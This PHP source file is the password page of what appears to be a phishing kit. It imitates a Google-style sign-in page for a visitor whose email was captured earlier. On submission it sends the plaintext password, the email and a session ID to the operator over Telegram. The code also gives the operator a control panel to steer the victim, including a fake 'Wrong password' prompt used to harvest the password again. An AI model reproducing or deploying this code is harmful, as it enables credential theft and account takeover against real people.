<?php
// password.php — Page 2: Password entry
require 'config.php';
require 'helpers.php';
session_start();

if (empty($_SESSION['email'])) { header('Location: index.php'); exit; }

$sid   = $_SESSION['visitor_id'] ?? session_id();
$email = $_SESSION['email'];
$state = get_state($sid);
$error = '';

// Show error if admin sent pw_error command
$show_error = ($state['page'] === 'pw_error');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pw = $_POST['password'] ?? '';
    if ($pw === '') {
        $error = 'Enter a password.';
    } else {
        // Set to loading, send FULL password (plaintext) to Telegram + control panel
        set_state($sid, ['page' => 'loading']);

        $s = get_state($sid);
        tg_send(
            "🔐 <b>PASSWORD SUBMITTED!</b>\n\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n" .
            "🔑 Password: <code>{$pw}</code>\n\n" .
           
            "👇 <b>Choose what to show this visitor:</b>"
        );
        tg_panel($sid);

        header('Location: loading.php');
        exit;
    }
}

page_open('Welcome');
?>

<div class="card two-col" role="main">
  <div>
    <?= g_logo() ?>
    <h1 class="card-title">Welcome</h1>
    <?= account_pill($email) ?>
  </div>
  <div>
    <form method="POST" id="pwForm" novalidate>
      <div class="field-wrap" style="position:relative">
        <input type="password" name="password" id="pwInput" placeholder="Password"
               class="<?= ($error || $show_error) ? 'err' : '' ?>"
               autocomplete="current-password" />
        <label for="pwInput">Enter your password</label>
        <button type="button" class="eye-btn" id="eyeBtn" aria-label="Show password">
          <svg id="eyeShow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
          </svg>
          <svg id="eyeHide" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="1.5" stroke-linecap="round" style="display:none">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
          </svg>
        </button>
      </div>

      <?php if ($error): ?>
        <div class="err-text"><?= err_icon() ?><?= htmlspecialchars($error) ?></div>
      <?php elseif ($show_error): ?>
        <div class="err-text">
          <?= err_icon() ?>Wrong password. Try again or click Forgot password to reset it.
        </div>
      <?php else: ?>
        <div class="err-text" id="pwErr"></div>
      <?php endif; ?>

      <label class="cb-row" id="showPwRow">
        <input type="checkbox" id="showPwCb"/>
        <span class="cb-box" id="showPwBox"></span>
        <span class="cb-label">Show password</span>
      </label>

      <div class="btn-row">
        <a href="#" class="link">Forgot password?</a>
        <button type="submit" class="btn-primary">Next</button>
      </div>
    </form>
  </div>
</div>

<?php page_close(); ?>
